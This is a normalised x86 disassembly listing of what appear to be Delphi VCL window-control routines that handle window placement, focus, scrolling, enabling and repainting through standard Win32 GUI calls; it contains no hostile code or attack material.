mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403448
pop esi
pop ebx
retn
mov eax ebx
call sub_440a08
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_40445c
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_40445c
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_445fe0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44452c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_442120
sub_446040
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4442a0
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_44369c
pop ebx
retn
sub_446070
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_446098
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_446ee8
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_44369c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_446108
push ebx
mov ebx eax
mov eax ebx
call sub_441f8c
mov eax ebx
call sub_446ee8
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_44393c
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_422f68
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_441578
sub_446144
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43ec70
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_446be4
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_441578
sub_446184
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_446ee8
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_446be4
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4461c4
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_44393c
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_446ee8
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_446aec
sub_446204
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_446d24
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_446d24
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_446264
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_440fd4
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_43ff08
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_444498
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_4462d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4420c4
mov edx esi
mov eax ebx
call sub_4438fc
pop esi
pop ebx
retn
sub_4462f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_43d300
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_457218
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403448
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403448
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403448
test al al
jne r-xdata
sub_446384
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_447d50
mov edx esi
mov eax ebx
call sub_4462f0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_441578
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_441578
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_441578
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_457218
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_441578
test eax eax
jne r-xdata
jmp r-xdata
sub_446468
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_441578
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_4464bc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_441578
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_457218
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_441578
test eax eax
jne r-xdata
sub_446508
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_4462f0
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_441578
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_457218
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_441578
test eax eax
jne r-xdata
sub_446564
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_457218
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_441578
mov [ esi + 0xc ] eax
sub_446598
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_446ee8
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_446ee8
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43fa18
mov eax ebx
mov si 0xffd0
call sub_403448
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_43fd64
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_446670
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_4438dc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_4438a0
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403448
inc edi
dec ebx
jne r-xdata
sub_4466b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443444
xor eax eax
push ebp
push sub_446756
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446670
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ffe0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44675d
mov eax [ ebp - 0x4 ]
call sub_44344c
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_446764
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_4438dc
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_44346c
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_4438a0
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_446854
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_41a294
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_41a128
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_41a2b4
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_41a238
call sub_446be4
jmp r-xdata
mov eax ebp
mov edx esi
call sub_41a238
call sub_446be4
sub_44692c
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_446854
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_44698c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_446be4
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_446be4
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
test eax eax
jne r-xdata
sub_446a28
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_446ee8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_441578
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_430fe0
call sub_4310c0
test al al
je r-xdata
mov eax ebx
call sub_4438dc
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4438a0
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_4438a0
test [ eax + 0x52 ] 0x4
je r-xdata
sub_446aec
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43fd64
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_446b24
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_457218
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_446b64
push ebx
mov ebx eax
mov eax ebx
call sub_457218
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_45af84
pop ebx
retn
mov eax ebx
call sub_457240
mov eax ebx
call sub_446be4
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_446b9c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446bc0
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_446bc0
sub_446bf8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_418e04
mov eax edi
call sub_4438dc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_4438a0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_446c8c
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_446be4
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_446cc4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_446ee8
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_446be4
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403448
sub_446d80
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_41a294
pop esi
pop ebx
retn
sub_446da4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_446d80
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_41a128
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_41a2b4
sub_446e18
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_446ee8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_441578
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_446e78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_446edc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446ee3
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403448
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4059e4
sub_446ef4
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43fa18
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_446fac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_41a238
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_41a0dc
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403448
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_44700c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_447102
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403448
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447109
mov eax [ ebp - 0x14 ]
call sub_40324c
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_41a294
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_41a238
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403448
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_447118
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_44700c
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_447144
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_457218
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44700c
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44700c
mov edx eax
mov eax esi
call sub_45ae84
sub_447188
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4438dc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4438a0
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4471d0
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_446854
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_440634
sub_447218
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
